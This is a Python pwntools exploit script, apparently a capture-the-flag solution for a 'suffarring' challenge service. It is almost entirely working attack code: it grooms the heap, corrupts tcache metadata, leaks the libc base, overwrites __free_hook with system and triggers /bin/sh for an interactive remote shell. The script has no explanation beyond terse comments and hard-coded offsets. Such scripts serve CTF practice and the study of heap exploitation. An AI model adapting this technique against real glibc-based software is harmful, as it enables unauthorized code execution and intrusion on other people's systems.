#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from pwn import *
import time
import os
import sys
import time

elf = ""
libc = ""
env = ""
LOCAL = 1
context.log_level = "debug"

#p = process("./suffarring_noalarm")
p = remote("suffarring.pwni.ng", 7361)

p.recvuntil("> ")

def add(size, data):

    p.sendline("A")
    p.recvuntil("> ")
    p.sendline(str(size))
    p.recvuntil("> ")
    p.sendline(data)
    p.recvuntil("> ")


def addnonenter(size, data):

    p.sendline("A")
    p.recvuntil("> ")
    p.sendline(str(size))
    p.recvuntil("> ")
    p.send(data)
    p.recvuntil("> ")


def addnonentershell(size, data):

    p.sendline("A")
    p.recvuntil("> ")
    p.sendline(str(size))
    p.recvuntil("> ")
    p.send(data)
    p.interactive()
    p.recvuntil("> ")






def count(idx, needlesize, needle):

    p.sendline("C")
    p.recvuntil("> ")
    p.sendline(str(idx)) #idx must hit or we in dead loop
    p.recvuntil("> ")
    p.sendline(str(needlesize))
    p.recvuntil("> ")
    p.sendline(needle)
    data = p.recvuntil("> ")
    return data 

def delete(idx):

    p.sendline("D")
    p.recvuntil("> ")
    p.sendline(str(idx))
    p.recvuntil("> ")

def printtext(idx):

    p.sendline("P")
    p.recvuntil("> ")
    p.sendline(str(idx))
    data = p.recvuntil("> ")
    return data

def inputnumber(num):

    p.sendline("I")
    p.recvuntil("> > ")
    p.sendline(str(num))
    p.recvuntil("> ")

def listtexts():

    p.sendline("M")
    data = p.recvuntil("> ")
    return data 

def recant(idx,length,data): #crash

    p.sendline("R")
    p.recvuntil("> ")
    p.sendline(str(idx))
    p.recvuntil("> ")
    p.sendline(str(length))
    p.recvuntil("> ")
    p.sendline(data)
    rec = p.recvuntil("> ")
    return rec


def recantnonenter(idx,length,data): #crash

    p.sendline("R")
    p.recvuntil("> ")
    p.sendline(str(idx))
    p.recvuntil("> ")
    p.sendline(str(length))
    p.recvuntil("> ")
    p.send(data)
    rec = p.recvuntil("> ")
    return rec


# step1 heapfengshui to 
# 0x20 tcache adjacent to some control block.
#
#

dump_size = 0x920
payload0 = "a" * 0x40 + p64(0x31) + p64(dump_size) #modify size

add(0x90, "a"*(0x90-1)) #0
addnonenter(0x50, payload0) #1 padding the end

# fengshui
delete(0)

#padding 
add(0x85, "b"*(0x85-1)) #0 form 0x70.
add(0x18, "c"*(0x18-1)) #2
add(0x18, "d"*(0x18-1)) #3
delete(3)

#try leak 

# try del 


raw_input("try recant")

payload = p64(0x6161616161616161) * 3 + p64(0x31) + p64(dump_size) + p64(0) + p64(0x291) + p64(0) + p64(0x61) + p64(0x61c2) + p64(0x0000000000622423)

recantnonenter(1, 0x58, payload)

#add(0x100, "a"*(0x100-1)) #3

add(0x18, "x"*(0x18-1)) #3
add(0x18, "x"*(0x18-1)) #5
add(0x18, "x"*(0x18-1)) #4

delete(4)
delete(2)

addrs = printtext(1) 
print addrs

libc = addrs[-67:-59]
libc_= ''.join(libc)
libc_base = u64(libc_) - 0x3ebca0
print hex(libc_base)
freehook = libc_base + 0x3ed8e8

# recover 0x20
add(0x18, "a"*(0x18-1)) #2
add(0x18, "a"*(0x18-1)) #4 5

#recovered !
add(0x90, "a"*(0x90-1)) #6. make  unsorted bin1

payload3 = p64(0x6161616161616161) * 9 + p64(0x6161616161616161) * 3 + p64(0x21) + p64(freehook) + p64(0x6161616161616161) * 2 + p64(0x31) + p64(200) 
addnonenter(0x90, payload3) #7
delete(6)


p1 = "/bin/sh\0"
p1 = p1.ljust(0x85-1,'\0')
add(0x85, p1) #6
add(0x18, "z"*(0x18-1)) #8
add(0x18, "m"*(0x18-1)) #9
delete(9)
delete(8)

payload4 = p64(0x6161616161616161) * 3 + p64(0x21) + p64(freehook) + p64(0x6161616161616161) * 2 + p64(0x31) + p64(0xc8) + p64(0) + p64(0x491) + p64(0) + p64(0x61)
payload4 += p64(0x00000000000061c2) + p64(0x0000000000622423) + p64(0x0000000062864784) + p64(0x00000062e8cdcbe5) + p64(0x0000634bb699b146) + p64(0x0063af02504af7a7)

recantnonenter(7, 0x98, payload4)

one = libc_base + 0x10a38c
system = libc_base + 0x4f440
addnonenter(0x18, p64(system)*3)
addnonenter(0x18, p64(system)*3)
addnonentershell(0x18, p64(system)*3)
p.sendline("D")
time.sleep(0.2)
p.sendline("6")

p.interactive()










